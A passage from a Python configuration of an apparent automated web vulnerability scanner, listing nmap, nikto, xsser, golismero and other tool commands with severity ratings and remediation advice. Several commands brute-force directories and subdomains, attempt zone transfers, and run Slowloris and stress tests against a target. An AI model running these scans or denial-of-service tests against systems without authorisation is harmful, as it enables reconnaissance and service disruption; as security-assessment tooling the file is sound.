                ["nmap_ccs","Nmap [OpenSSL CCS Injection] - Checks only for CCS Injection.","nmap",1],

                #20
                ["nmap_freak","Nmap [FREAK] - Checks only for FREAK Vulnerability.","nmap",1],

                #21
                ["nmap_logjam","Nmap [LOGJAM] - Checks for LOGJAM Vulnerability.","nmap",1],

                #22
                ["sslyze_ocsp","SSLyze - Checks for OCSP Stapling.","sslyze",1],

                #23
                ["sslyze_zlib","SSLyze - Checks for ZLib Deflate Compression.","sslyze",1],

                #24
                ["sslyze_reneg","SSLyze - Checks for Secure Renegotiation Support and Client Renegotiation.","sslyze",1],

                #25
                ["sslyze_resum","SSLyze - Checks for Session Resumption Support with [Session IDs/TLS Tickets].","sslyze",1],

                #26
                ["lbd","LBD - Checks for DNS/HTTP Load Balancers.","lbd",1],

                #27
                ["golismero_dns_malware","Golismero - Checks if the domain is spoofed or hijacked.","golismero",1],

                #28
                ["golismero_heartbleed","Golismero - Checks only for Heartbleed Vulnerability.","golismero",1],

                #29
                ["golismero_brute_url_predictables","Golismero - BruteForces for certain files on the Domain.","golismero",1],

                #30
                ["golismero_brute_directories","Golismero - BruteForces for certain directories on the Domain.","golismero",1],

                #31
                ["golismero_sqlmap","Golismero - SQLMap [Retrieves only the DB Banner]","golismero",1],

                #32
                ["dirb","DirB - Brutes the target for Open Directories.","dirb",1],

                #33
                ["xsser","XSSer - Checks for Cross-Site Scripting [XSS] Attacks.","xsser",1],

                #34
                ["golismero_ssl_scan","Golismero SSL Scans - Performs SSL related Scans.","golismero",1],

                #35
                ["golismero_zone_transfer","Golismero Zone Transfer - Attempts Zone Transfer.","golismero",1],

                #36
                ["golismero_nikto","Golismero Nikto Scans - Uses Nikto Plugin to detect vulnerabilities.","golismero",1],

                #37
                ["golismero_brute_subdomains","Golismero Subdomains Bruter - Brute Forces Subdomain Discovery.","golismero",1],

                #38
                ["dnsenum_zone_transfer","DNSEnum - Attempts Zone Transfer.","dnsenum",1],

                #39
                ["fierce_brute_subdomains","Fierce Subdomains Bruter - Brute Forces Subdomain Discovery.","fierce",1],

                #40
                ["dmitry_email","DMitry - Passively Harvests Emails from the Domain.","dmitry",1],

                #41
                ["dmitry_subdomains","DMitry - Passively Harvests Subdomains from the Domain.","dmitry",1],

                #42
                ["nmap_telnet","Nmap [TELNET] - Checks if TELNET service is running.","nmap",1],

                #43
                ["nmap_ftp","Nmap [FTP] - Checks if FTP service is running.","nmap",1],

                #44
                ["nmap_stuxnet","Nmap [STUXNET] - Checks if the host is affected by STUXNET Worm.","nmap",1],

                #45
                ["webdav","WebDAV - Checks if WEBDAV enabled on Home directory.","davtest",1],

                #46
                ["golismero_finger","Golismero - Does a fingerprint on the Domain.","golismero",1],

                #47
                ["uniscan_filebrute","Uniscan - Brutes for Filenames on the Domain.","uniscan",1],

                #48
                ["uniscan_dirbrute", "Uniscan - Brutes Directories on the Domain.","uniscan",1],

                #49
                ["uniscan_ministresser", "Uniscan - Stress Tests the Domain.","uniscan",1],

                #50
                ["uniscan_rfi","Uniscan - Checks for LFI, RFI and RCE.","uniscan",1],

                #51
                ["uniscan_xss","Uniscan - Checks for XSS, SQLi, BSQLi & Other Checks.","uniscan",1],

                #52
                ["nikto_xss","Nikto - Checks for Apache Expect XSS Header.","nikto",1],

                #53
                ["nikto_subrute","Nikto - Brutes Subdomains.","nikto",1],

                #54
                ["nikto_shellshock","Nikto - Checks for Shellshock Bug.","nikto",1],

                #55
                ["nikto_internalip","Nikto - Checks for Internal IP Leak.","nikto",1],

                #56
                ["nikto_putdel","Nikto - Checks for HTTP PUT DEL.","nikto",1],

                #57
                ["nikto_headers","Nikto - Checks the Domain Headers.","nikto",1],

                #58
                ["nikto_ms01070","Nikto - Checks for MS10-070 Vulnerability.","nikto",1],

                #59
                ["nikto_servermsgs","Nikto - Checks for Server Issues.","nikto",1],

                #60
                ["nikto_outdated","Nikto - Checks if Server is Outdated.","nikto",1],

                #61
                ["nikto_httpoptions","Nikto - Checks for HTTP Options on the Domain.","nikto",1],

                #62
                ["nikto_cgi","Nikto - Enumerates CGI Directories.","nikto",1],

                #63
                ["nikto_ssl","Nikto - Performs SSL Checks.","nikto",1],

                #64
                ["nikto_sitefiles","Nikto - Checks for any interesting files on the Domain.","nikto",1],

                #65
                ["nikto_paths","Nikto - Checks for Injectable Paths.","nikto",1],

                #66
                ["dnsmap_brute","DNSMap - Brutes Subdomains.","dnsmap",1],

                #67
                ["nmap_sqlserver","Nmap - Checks for MS-SQL Server DB","nmap",1],

                #68
                ["nmap_mysql", "Nmap - Checks for MySQL DB","nmap",1],

                #69
                ["nmap_oracle", "Nmap - Checks for ORACLE DB","nmap",1],

                #70
                ["nmap_rdp_udp","Nmap - Checks for Remote Desktop Service over UDP","nmap",1],

                #71
                ["nmap_rdp_tcp","Nmap - Checks for Remote Desktop Service over TCP","nmap",1],

                #72
                ["nmap_full_ps_tcp","Nmap - Performs a Full TCP Port Scan","nmap",1],

                #73
                ["nmap_full_ps_udp","Nmap - Performs a Full UDP Port Scan","nmap",1],

                #74
                ["nmap_snmp","Nmap - Checks for SNMP Service","nmap",1],

                #75
                ["aspnet_elmah_axd","Checks for ASP.net Elmah Logger","wget",1],

                #76
                ["nmap_tcp_smb","Checks for SMB Service over TCP","nmap",1],

                #77
                ["nmap_udp_smb","Checks for SMB Service over UDP","nmap",1],

                #78
                ["wapiti","Wapiti - Checks for SQLi, RCE, XSS and Other Vulnerabilities","wapiti",1],

                #79
                ["nmap_iis","Nmap - Checks for IIS WebDAV","nmap",1],

                #80
                ["whatweb","WhatWeb - Checks for X-XSS Protection Header","whatweb",1],

                #81
                ["amass","AMass - Brutes Domain for Subdomains","amass",1]
            ]


# Command that is used to initiate the tool (with parameters and extra params)
tool_cmd   = [
                #1
                ["host ",""],

                #2
                ["wget -O /tmp/busybees_temp_aspnet_config_err --tries=1 ","/%7C~.aspx"],

                #3
                ["wget -O /tmp/busybees_temp_wp_check --tries=1 ","/wp-admin"],

                #4
                ["wget -O /tmp/busybees_temp_drp_check --tries=1 ","/user"],

                #5
                ["wget -O /tmp/busybees_temp_joom_check --tries=1 ","/administrator"],

                #6
                ["uniscan -e -u ",""],

                #7
                ["wafw00f ",""],

                #8
                ["nmap -F --open -Pn ",""],

                #9
                ["theHarvester -l 50 -b censys -d ",""],

                #10
                ["dnsrecon -d ",""],

                #11
                #["fierce -wordlist xxx -dns ",""],

                #12
                ["dnswalk -d ","."],

                #13
                ["whois ",""],

                #14
                ["nmap -p80 --script http-security-headers -Pn ",""],

                #15
                ["nmap -p80,443 --script http-slowloris --max-parallelism 500 -Pn ",""],

                #16
                ["sslyze --heartbleed ",""],

                #17
                ["nmap -p443 --script ssl-heartbleed -Pn ",""],

                #18
                ["nmap -p443 --script ssl-poodle -Pn ",""],

                #19
                ["nmap -p443 --script ssl-ccs-injection -Pn ",""],

                #20
                ["nmap -p443 --script ssl-enum-ciphers -Pn ",""],

                #21
                ["nmap -p443 --script ssl-dh-params -Pn ",""],

                #22
                ["sslyze --certinfo=basic ",""],

                #23
                ["sslyze --compression ",""],

                #24
                ["sslyze --reneg ",""],

                #25
                ["sslyze --resum ",""],

                #26
                ["lbd ",""],

                #27
                ["golismero -e dns_malware scan ",""],

                #28
                ["golismero -e heartbleed scan ",""],

                #29
                ["golismero -e brute_url_predictables scan ",""],

                #30
                ["golismero -e brute_directories scan ",""],

                #31
                ["golismero -e sqlmap scan ",""],

                #32
                ["dirb http://"," -fi"],

                #33
                ["xsser --all=http://",""],

                #34
                ["golismero -e sslscan scan ",""],

                #35
                ["golismero -e zone_transfer scan ",""],

                #36
                ["golismero -e nikto scan ",""],

                #37
                ["golismero -e brute_dns scan ",""],

                #38
                ["dnsenum ",""],

                #39
                ["fierce --domain ",""],

                #40
                ["dmitry -e ",""],

                #41
                ["dmitry -s ",""],

                #42
                ["nmap -p23 --open -Pn ",""],

                #43
                ["nmap -p21 --open -Pn ",""],

                #44
                ["nmap --script stuxnet-detect -p445 -Pn ",""],

                #45
                ["davtest -url http://",""],

                #46
                ["golismero -e fingerprint_web scan ",""],

                #47
                ["uniscan -w -u ",""],

                #48
                ["uniscan -q -u ",""],

                #49
                ["uniscan -r -u ",""],

                #50
                ["uniscan -s -u ",""],

                #51
                ["uniscan -d -u ",""],

                #52
                ["nikto -Plugins 'apache_expect_xss' -host ",""],

                #53
                ["nikto -Plugins 'subdomain' -host ",""],

                #54
                ["nikto -Plugins 'shellshock' -host ",""],

                #55
                ["nikto -Plugins 'cookies' -host ",""],

                #56
                ["nikto -Plugins 'put_del_test' -host ",""],

                #57
                ["nikto -Plugins 'headers' -host ",""],

                #58
                ["nikto -Plugins 'ms10-070' -host ",""],

                #59
                ["nikto -Plugins 'msgs' -host ",""],

                #60
                ["nikto -Plugins 'outdated' -host ",""],

                #61
                ["nikto -Plugins 'httpoptions' -host ",""],

                #62
                ["nikto -Plugins 'cgi' -host ",""],

                #63
                ["nikto -Plugins 'ssl' -host ",""],

                #64
                ["nikto -Plugins 'sitefiles' -host ",""],

                #65
                ["nikto -Plugins 'paths' -host ",""],

                #66
                ["dnsmap ",""],

                #67
                ["nmap -p1433 --open -Pn ",""],

                #68
                ["nmap -p3306 --open -Pn ",""],

                #69
                ["nmap -p1521 --open -Pn ",""],

                #70
                ["nmap -p3389 --open -sU -Pn ",""],

                #71
                ["nmap -p3389 --open -sT -Pn ",""],

                #72
                ["nmap -p1-65535 --open -Pn ",""],

                #73
                ["nmap -p1-65535 -sU --open -Pn ",""],

                #74
                ["nmap -p161 -sU --open -Pn ",""],

                #75
                ["wget -O /tmp/busybees_temp_aspnet_elmah_axd --tries=1 ","/elmah.axd"],

                #76
                ["nmap -p445,137-139 --open -Pn ",""],

                #77
                ["nmap -p137,138 --open -Pn ",""],

                #78
                ["wapiti "," -f txt -o busybees_temp_wapiti"],

                #79
                ["nmap -p80 --script=http-iis-webdav-vuln -Pn ",""],
                
                #80
                ["whatweb "," -a 1"],

                #81
                ["amass enum -d ",""]
            ]


# Tool Responses (Begins) [Responses + Severity (c - critical | h - high | m - medium | l - low | i - informational) + Reference for Vuln Definition and Remediation]
tool_resp   = [
                #1
                ["Does not have an IPv6 Address. It is good to have one.","i",1],

                #2
                ["ASP.Net is misconfigured to throw server stack errors on screen.","m",2],

                #3
                ["WordPress Installation Found. Check for vulnerabilities corresponds to that version.","i",3],

                #4
                ["Drupal Installation Found. Check for vulnerabilities corresponds to that version.","i",4],

                #5
                ["Joomla Installation Found. Check for vulnerabilities corresponds to that version.","i",5],

                #6
                ["robots.txt/sitemap.xml found. Check those files for any information.","i",6],

                #7
                ["No Web Application Firewall Detected","m",7],

                #8
                ["Some ports are open. Perform a full-scan manually.","l",8],

                #9
                ["Email Addresses Found.","l",9],

                #10
                ["Zone Transfer Successful using DNSRecon. Reconfigure DNS immediately.","h",10],

                #11
                #["Zone Transfer Successful using fierce. Reconfigure DNS immediately.","h",10],

                #12
                ["Zone Transfer Successful using dnswalk. Reconfigure DNS immediately.","h",10],

                #13
                ["Whois Information Publicly Available.","i",11],

                #14
                ["XSS Protection Filter is Disabled.","m",12],

                #15
                ["Vulnerable to Slowloris Denial of Service.","c",13],

                #16
                ["HEARTBLEED Vulnerability Found with SSLyze.","h",14],

                #17
                ["HEARTBLEED Vulnerability Found with Nmap.","h",14],

                #18
                ["POODLE Vulnerability Detected.","h",15],

                #19
                ["OpenSSL CCS Injection Detected.","h",16],

                #20
                ["FREAK Vulnerability Detected.","h",17],

                #21
                ["LOGJAM Vulnerability Detected.","h",18],

                #22
                ["Unsuccessful OCSP Response.","m",19],

                #23
                ["Server supports Deflate Compression.","m",20],

                #24
                ["Secure Client Initiated Renegotiation is supported.","m",21],

                #25
                ["Secure Resumption unsupported with (Sessions IDs/TLS Tickets).","m",22],

                #26
                ["No DNS/HTTP based Load Balancers Found.","l",23],

                #27
                ["Domain is spoofed/hijacked.","h",24],

                #28
                ["HEARTBLEED Vulnerability Found with Golismero.","h",14],

                #29
                ["Open Files Found with Golismero BruteForce.","m",25],

                #30
                ["Open Directories Found with Golismero BruteForce.","m",26],

                #31
                ["DB Banner retrieved with SQLMap.","l",27],

                #32
                ["Open Directories Found with DirB.","m",26],

                #33
                ["XSSer found XSS vulnerabilities.","c",28],

                #34
                ["Found SSL related vulnerabilities with Golismero.","m",29],

                #35
                ["Zone Transfer Successful with Golismero. Reconfigure DNS immediately.","h",10],

                #36
                ["Golismero Nikto Plugin found vulnerabilities.","m",30],

                #37
                ["Found Subdomains with Golismero.","m",31],

                #38
                ["Zone Transfer Successful using DNSEnum. Reconfigure DNS immediately.","h",10],

                #39
                ["Found Subdomains with Fierce.","m",31],

                #40
                ["Email Addresses discovered with DMitry.","l",9],

                #41
                ["Subdomains discovered with DMitry.","m",31],

                #42
                ["Telnet Service Detected.","h",32],

                #43
                ["FTP Service Detected.","c",33],

                #44
                ["Vulnerable to STUXNET.","c",34],

                #45
                ["WebDAV Enabled.","m",35],

                #46
                ["Found some information through Fingerprinting.","l",36],

                #47
                ["Open Files Found with Uniscan.","m",25],

                #48
                ["Open Directories Found with Uniscan.","m",26],

                #49
                ["Vulnerable to Stress Tests.","h",37],

                #50
                ["Uniscan detected possible LFI, RFI or RCE.","h",38],

                #51
                ["Uniscan detected possible XSS, SQLi, BSQLi.","h",39],

                #52
                ["Apache Expect XSS Header not present.","m",12],

                #53
                ["Found Subdomains with Nikto.","m",31],

                #54
                ["Webserver vulnerable to Shellshock Bug.","c",40],

                #55
                ["Webserver leaks Internal IP.","l",41],

                #56
                ["HTTP PUT DEL Methods Enabled.","m",42],

                #57
                ["Some vulnerable headers exposed.","m",43],

                #58
                ["Webserver vulnerable to MS10-070.","h",44],

                #59
                ["Some issues found on the Webserver.","m",30],

                #60
                ["Webserver is Outdated.","h",45],

                #61
                ["Some issues found with HTTP Options.","l",42],

                #62
                ["CGI Directories Enumerated.","l",26],

                #63
                ["Vulnerabilities reported in SSL Scans.","m",29],

                #64
                ["Interesting Files Detected.","m",25],

                #65
                ["Injectable Paths Detected.","l",46],

                #66
                ["Found Subdomains with DNSMap.","m",31],

                #67
                ["MS-SQL DB Service Detected.","l",47],

                #68
                ["MySQL DB Service Detected.","l",47],

                #69
                ["ORACLE DB Service Detected.","l",47],

                #70
                ["RDP Server Detected over UDP.","h",48],

                #71
                ["RDP Server Detected over TCP.","h",48],

                #72
                ["TCP Ports are Open","l",8],

                #73
                ["UDP Ports are Open","l",8],

                #74
                ["SNMP Service Detected.","m",49],

                #75
                ["Elmah is Configured.","m",50],

                #76
                ["SMB Ports are Open over TCP","m",51],

                #77
                ["SMB Ports are Open over UDP","m",51],

                #78
                ["Wapiti discovered a range of vulnerabilities","h",30],

                #79
                ["IIS WebDAV is Enabled","m",35],

                #80
                ["X-XSS Protection is not Present","m",12],

                #81
                ["Found Subdomains with AMass","m",31]



            ]

# Tool Responses (Ends)



# Tool Status (Response Data + Response Code (if status check fails and you still got to push it + Legends + Approx Time + Tool Identification + Bad Responses)
tool_status = [
                #1
                ["has IPv6",1,proc_low," < 15s","ipv6",["not found","has IPv6"]],

                #2
                ["Server Error",0,proc_low," < 30s","asp.netmisconf",["unable to resolve host address","Connection timed out"]],

                #3
                ["wp-login",0,proc_low," < 30s","wpcheck",["unable to resolve host address","Connection timed out"]],

                #4
                ["drupal",0,proc_low," < 30s","drupalcheck",["unable to resolve host address","Connection timed out"]],

                #5
                ["joomla",0,proc_low," < 30s","joomlacheck",["unable to resolve host address","Connection timed out"]],

                #6
                ["[+]",0,proc_low," < 40s","robotscheck",["Use of uninitialized value in unpack at"]],

                #7
                ["No WAF",0,proc_low," < 45s","wafcheck",["appears to be down"]],

                #8
                ["tcp open",0,proc_med," <  2m","nmapopen",["Failed to resolve"]],

                #9
                ["No emails found",1,proc_med," <  3m","harvester",["No hosts found","No emails found"]],

                #10
                ["[+] Zone Transfer was successful!!",0,proc_low," < 20s","dnsreconzt",["Could not resolve domain"]],

                #11
                #["Whoah, it worked",0,proc_low," < 30s","fiercezt",["none"]],

                #12
                ["0 errors",0,proc_low," < 35s","dnswalkzt",["!!!0 failures, 0 warnings, 3 errors."]],

                #13
                ["Admin Email:",0,proc_low," < 25s","whois",["No match for domain"]],

                #14
                ["XSS filter is disabled",0,proc_low," < 20s","nmapxssh",["Failed to resolve"]],

                #15
                ["VULNERABLE",0,proc_high," < 45m","nmapdos",["Failed to resolve"]],

                #16
                ["Server is vulnerable to Heartbleed",0,proc_low," < 40s","sslyzehb",["Could not resolve hostname"]],

                #17
                ["VULNERABLE",0,proc_low," < 30s","nmap1",["Failed to resolve"]],

                #18
                ["VULNERABLE",0,proc_low," < 35s","nmap2",["Failed to resolve"]],

                #19
                ["VULNERABLE",0,proc_low," < 35s","nmap3",["Failed to resolve"]],

                #20
                ["VULNERABLE",0,proc_low," < 30s","nmap4",["Failed to resolve"]],

                #21
                ["VULNERABLE",0,proc_low," < 35s","nmap5",["Failed to resolve"]],

                #22
                ["ERROR - OCSP response status is not successful",0,proc_low," < 25s","sslyze1",["Could not resolve hostname"]],

                #23
                ["VULNERABLE",0,proc_low," < 30s","sslyze2",["Could not resolve hostname"]],

                #24
                ["VULNERABLE",0,proc_low," < 25s","sslyze3",["Could not resolve hostname"]],

                #25
                ["VULNERABLE",0,proc_low," < 30s","sslyze4",["Could not resolve hostname"]],

                #26
                ["does NOT use Load-balancing",0,proc_med," <  4m","lbd",["NOT FOUND"]],

                #27
                ["No vulnerabilities found",1,proc_low," < 45s","golism1",["Cannot resolve domain name","No vulnerabilities found"]],

                #28
                ["No vulnerabilities found",1,proc_low," < 40s","golism2",["Cannot resolve domain name","No vulnerabilities found"]],

                #29
                ["No vulnerabilities found",1,proc_low," < 45s","golism3",["Cannot resolve domain name","No vulnerabilities found"]],

                #30
                ["No vulnerabilities found",1,proc_low," < 40s","golism4",["Cannot resolve domain name","No vulnerabilities found"]],

                #31
                ["No vulnerabilities found",1,proc_low," < 45s","golism5",["Cannot resolve domain name","No vulnerabilities found"]],

                #32
                ["FOUND: 0",1,proc_high," < 35m","dirb",["COULDNT RESOLVE HOST","FOUND: 0"]],

                #33
                ["Could not find any vulnerability!",1,proc_med," <  4m","xsser",["XSSer is not working propertly!","Could not find any vulnerability!"]],

                #34
                ["Occurrence ID",0,proc_low," < 45s","golism6",["Cannot resolve domain name"]],

                #35
                ["DNS zone transfer successful",0,proc_low," < 30s","golism7",["Cannot resolve domain name"]],

                #36
                ["Nikto found 0 vulnerabilities",1,proc_med," <  4m","golism8",["Cannot resolve domain name","Nikto found 0 vulnerabilities"]],

                #37
                ["Possible subdomain leak",0,proc_high," < 30m","golism9",["Cannot resolve domain name"]],

                #38
                ["AXFR record query failed:",1,proc_low," < 45s","dnsenumzt",["NS record query failed:","AXFR record query failed","no NS record for"]],

                #39
                ["Found 0 entries",1,proc_high," < 75m","fierce2",["Found 0 entries","is gimp"]],

                #40
                ["Found 0 E-Mail(s)",1,proc_low," < 30s","dmitry1",["Unable to locate Host IP addr","Found 0 E-Mail(s)"]],

                #41
                ["Found 0 possible subdomain(s)",1,proc_low," < 35s","dmitry2",["Unable to locate Host IP addr","Found 0 possible subdomain(s)"]],

                #42
                ["open",0,proc_low," < 15s","nmaptelnet",["Failed to resolve"]],

                #43
                ["open",0,proc_low," < 15s","nmapftp",["Failed to resolve"]],

                #44
                ["open",0,proc_low," < 20s","nmapstux",["Failed to resolve"]],

                #45
                ["SUCCEED",0,proc_low," < 30s","webdav",["is not DAV enabled or not accessible."]],

                #46
                ["No vulnerabilities found",1,proc_low," < 15s","golism10",["Cannot resolve domain name","No vulnerabilities found"]],

                #47
                ["[+]",0,proc_med," <  2m","uniscan2",["Use of uninitialized value in unpack at"]],

                #48
                ["[+]",0,proc_med," <  5m","uniscan3",["Use of uninitialized value in unpack at"]],

                #49
                ["[+]",0,proc_med," <  9m","uniscan4",["Use of uninitialized value in unpack at"]],

                #50
                ["[+]",0,proc_med," <  8m","uniscan5",["Use of uninitialized value in unpack at"]],

                #51
                ["[+]",0,proc_med," <  9m","uniscan6",["Use of uninitialized value in unpack at"]],

                #52
                ["0 item(s) reported",1,proc_low," < 35s","nikto1",["ERROR: Cannot resolve hostname","0 item(s) reported","No web server found","0 host(s) tested"]],

                #53
                ["0 item(s) reported",1,proc_low," < 35s","nikto2",["ERROR: Cannot resolve hostname","0 item(s) reported","No web server found","0 host(s) tested"]],

                #54
                ["0 item(s) reported",1,proc_low," < 35s","nikto3",["ERROR: Cannot resolve hostname","0 item(s) reported","No web server found","0 host(s) tested"]],

                #55
                ["0 item(s) reported",1,proc_low," < 35s","nikto4",["ERROR: Cannot resolve hostname","0 item(s) reported","No web server found","0 host(s) tested"]],

                #56
                ["0 item(s) reported",1,proc_low," < 35s","nikto5",["ERROR: Cannot resolve hostname","0 item(s) reported","No web server found","0 host(s) tested"]],

                #57
                ["0 item(s) reported",1,proc_low," < 35s","nikto6",["ERROR: Cannot resolve hostname","0 item(s) reported","No web server found","0 host(s) tested"]],

                #58
                ["0 item(s) reported",1,proc_low," < 35s","nikto7",["ERROR: Cannot resolve hostname","0 item(s) reported","No web server found","0 host(s) tested"]],

                #59
                ["0 item(s) reported",1,proc_low," < 35s","nikto8",["ERROR: Cannot resolve hostname","0 item(s) reported","No web server found","0 host(s) tested"]],

                #60
                ["0 item(s) reported",1,proc_low," < 35s","nikto9",["ERROR: Cannot resolve hostname","0 item(s) reported","No web server found","0 host(s) tested"]],

                #61
                ["0 item(s) reported",1,proc_low," < 35s","nikto10",["ERROR: Cannot resolve hostname","0 item(s) reported","No web server found","0 host(s) tested"]],

                #62
                ["0 item(s) reported",1,proc_low," < 35s","nikto11",["ERROR: Cannot resolve hostname","0 item(s) reported","No web server found","0 host(s) tested"]],

                #63
                ["0 item(s) reported",1,proc_low," < 35s","nikto12",["ERROR: Cannot resolve hostname","0 item(s) reported","No web server found","0 host(s) tested"]],

                #64
                ["0 item(s) reported",1,proc_low," < 35s","nikto13",["ERROR: Cannot resolve hostname","0 item(s) reported","No web server found","0 host(s) tested"]],

                #65
                ["0 item(s) reported",1,proc_low," < 35s","nikto14","ERROR: Cannot resolve hostname , 0 item(s) reported"],

                #66
                ["#1",0,proc_high," < 30m","dnsmap_brute",["[+] 0 (sub)domains and 0 IP address(es) found"]],

                #67
                ["open",0,proc_low," < 15s","nmapmssql",["Failed to resolve"]],

                #68
                ["open",0,proc_low," < 15s","nmapmysql",["Failed to resolve"]],

                #69
                ["open",0,proc_low," < 15s","nmaporacle",["Failed to resolve"]],

                #70
                ["open",0,proc_low," < 15s","nmapudprdp",["Failed to resolve"]],

                #71
                ["open",0,proc_low," < 15s","nmaptcprdp",["Failed to resolve"]],

                #72
                ["open",0,proc_high," > 50m","nmapfulltcp",["Failed to resolve"]],

                #73
                ["open",0,proc_high," > 75m","nmapfulludp",["Failed to resolve"]],

                #74
                ["open",0,proc_low," < 30s","nmapsnmp",["Failed to resolve"]],

                #75
                ["Microsoft SQL Server Error Log",0,proc_low," < 30s","elmahxd",["unable to resolve host address","Connection timed out"]],

                #76
                ["open",0,proc_low," < 20s","nmaptcpsmb",["Failed to resolve"]],

                #77
                ["open",0,proc_low," < 20s","nmapudpsmb",["Failed to resolve"]],

                #78
                ["Host:",0,proc_med," < 5m","wapiti",["none"]],

                #79
                ["WebDAV is ENABLED",0,proc_low," < 40s","nmapwebdaviis",["Failed to resolve"]],

                #80
                ["X-XSS-Protection[1",1,proc_med," < 3m","whatweb",["Timed out","Socket error","X-XSS-Protection[1"]],

                #81
                ["No names were discovered",1,proc_med," < 15m","amass",["The system was unable to build the pool of resolvers"]]



            ]

# Vulnerabilities and Remediation
tools_fix = [
                    [1, "Not a vulnerability, just an informational alert. The host does not have IPv6 support. IPv6 provides more security as IPSec (responsible for CIA - Confidentiality, Integrity and Availablity) is incorporated into this model. So it is good to have IPv6 Support.",
                            "It is recommended to implement IPv6. More information on how to implement IPv6 can be found from this resource. https://www.cisco.com/c/en/us/solutions/collateral/enterprise/cisco-on-cisco/IPv6-Implementation_CS.html"],
                    [2, "Sensitive Information Leakage Detected. The ASP.Net application does not filter out illegal characters in the URL. The attacker injects a special character (%7C~.aspx) to make the application spit sensitive information about the server stack.",
                            "It is recommended to filter out special charaters in the URL and set a custom error page on such situations instead of showing default error messages. This resource helps you in setting up a custom error page on a Microsoft .Net Application. https://docs.microsoft.com/en-us/aspnet/web-forms/overview/older-versions-getting-started/deploying-web-site-projects/displaying-a-custom-error-page-cs"],
                    [3, "It is not bad to have a CMS in WordPress. There are chances that the version may contain vulnerabilities or any third party scripts associated with it may possess vulnerabilities",
                            "It is recommended to conceal the version of WordPress. This resource contains more information on how to secure your WordPress Blog. https://codex.wordpress.org/Hardening_WordPress"],
                    [4, "It is not bad to have a CMS in Drupal. There are chances that the version may contain vulnerabilities or any third party scripts associated with it may possess vulnerabilities",
                            "It is recommended to conceal the version of Drupal. This resource contains more information on how to secure your Drupal Blog. https://www.drupal.org/docs/7/site-building-best-practices/ensure-that-your-site-is-secure"],
                    [5, "It is not bad to have a CMS in Joomla. There are chances that the version may contain vulnerabilities or any third party scripts associated with it may possess vulnerabilities",
                            "It is recommended to conceal the version of Joomla. This resource contains more information on how to secure your Joomla Blog. https://www.incapsula.com/blog/10-tips-to-improve-your-joomla-website-security.html"],
                    [6, "Sometimes robots.txt or sitemap.xml may contain rules such that certain links that are not supposed to be accessed/indexed by crawlers and search engines. Search engines may skip those links but attackers will be able to access it directly.",
                            "It is a good practice not to include sensitive links in the robots or sitemap files."],
                    [7, "Without a Web Application Firewall, An attacker may try to inject various attack patterns either manually or using automated scanners. An automated scanner may send hordes of attack vectors and patterns to validate an attack, there are also chances for the application to get DoS`ed (Denial of Service)",
                            "Web Application Firewalls offer great protection against common web attacks like XSS, SQLi, etc. They also provide an additional line of defense to your security infrastructure. This resource contains information on web application firewalls that could suit your application. https://www.gartner.com/reviews/market/web-application-firewall"],
                    [8, "Open Ports give attackers a hint to exploit the services. Attackers try to retrieve banner information through the ports and understand what type of service the host is running",
                            "It is recommended to close the ports of unused services and use a firewall to filter the ports wherever necessary. This resource may give more insights. https://security.stackexchange.com/a/145781/6137"],
                    [9, "Chances are very less to compromise a target with email addresses. However, attackers use this as a supporting data to gather information around the target. An attacker may make use of the username on the email address and perform brute-force attacks on not just email servers, but also on other legitimate panels like SSH, CMS, etc with a password list as they have a legitimate name. This is however a shoot in the dark scenario, the attacker may or may not be successful depending on the level of interest",
                            "Since the chances of exploitation is feeble there is no need to take action. Perfect remediation would be choosing different usernames for different services will be more thoughtful."],
                    [10, "Zone Transfer reveals critical topological information about the target. The attacker will be able to query all records and will have more or less complete knowledge about your host.",
                            "Good practice is to restrict the Zone Transfer by telling the Master which are the IPs of the slaves that can be given access for the query. This SANS resource  provides more information. https://www.sans.org/reading-room/whitepapers/dns/securing-dns-zone-transfer-868"],
                    [11, "The email address of the administrator and other information (address, phone, etc) is available publicly. An attacker may use these information to leverage an attack. This may not be used to carry out a direct attack as this is not a vulnerability. However, an attacker makes use of these data to build information about the target.",
                            "Some administrators intentionally would have made this information public, in this case it can be ignored. If not, it is recommended to mask the information. This resource provides information on this fix. http://www.name.com/blog/how-tos/tutorial-2/2013/06/protect-your-personal-information-with-whois-privacy/"],
                    [12, "As the target is lacking this header, older browsers will be prone to Reflected XSS attacks.",
                            "Modern browsers does not face any issues with this vulnerability (missing headers). However, older browsers are strongly recommended to be upgraded."],
                    [13, "This attack works by opening multiple simultaneous connections to the web server and it keeps them alive as long as possible by continously sending partial HTTP requests, which never gets completed. They easily slip through IDS by sending partial requests.",
                            "If you are using Apache Module, `mod_antiloris` would help. For other setup you can find more detailed remediation on this resource. https://www.acunetix.com/blog/articles/slow-http-dos-attacks-mitigate-apache-http-server/"],
                    [14, "This vulnerability seriously leaks private information of your host. An attacker can keep the TLS connection alive and can retrieve a maximum of 64K of data per heartbeat.",
                            "PFS (Perfect Forward Secrecy) can be implemented to make decryption difficult. Complete remediation and resource information is available here. http://heartbleed.com/"],
                    [15, "By exploiting this vulnerability, an attacker will be able gain access to sensitive data in a n encrypted session such as session ids, cookies and with those data obtained, will be able to impersonate that particular user.",
                            "This is a flaw in the SSL 3.0 Protocol. A better remediation would be to disable using the SSL 3.0 protocol. For more information, check this resource. https://www.us-cert.gov/ncas/alerts/TA14-290A"],
                    [16, "This attacks takes place in the SSL Negotiation (Handshake) which makes the client unaware of the attack. By successfully altering the handshake, the attacker will be able to pry on all the information that is sent from the client to server and vice-versa",
                            "Upgrading OpenSSL to latest versions will mitigate this issue. This resource gives more information about the vulnerability and the associated remediation. http://ccsinjection.lepidum.co.jp/"],
                    [17, "With this vulnerability the attacker will be able to perform a MiTM attack and thus compromising the confidentiality factor.",
                            "Upgrading OpenSSL to latest version will mitigate this issue. Versions prior to 1.1.0 is prone to this vulnerability. More information can be found in this resource. https://bobcares.com/blog/how-to-fix-sweet32-birthday-attacks-vulnerability-cve-2016-2183/"],
                    [18, "With the LogJam attack, the attacker will be able to downgrade the TLS connection which allows the attacker to read and modify any data passed over the connection.",
                            "Make sure any TLS libraries you use are up-to-date, that servers you maintain use 2048-bit or larger primes, and that clients you maintain reject Diffie-Hellman primes smaller than 1024-bit. More information can be found in this resource. https://weakdh.org/"],
                    [19, "Allows remote attackers to cause a denial of service (crash), and possibly obtain sensitive information in applications that use OpenSSL, via a malformed ClientHello handshake message that triggers an out-of-bounds memory access.",
                            " OpenSSL versions 0.9.8h through 0.9.8q and 1.0.0 through 1.0.0c are vulnerable. It is recommended to upgrade the OpenSSL version. More resource and information can be found here. https://www.openssl.org/news/secadv/20110208.txt"],
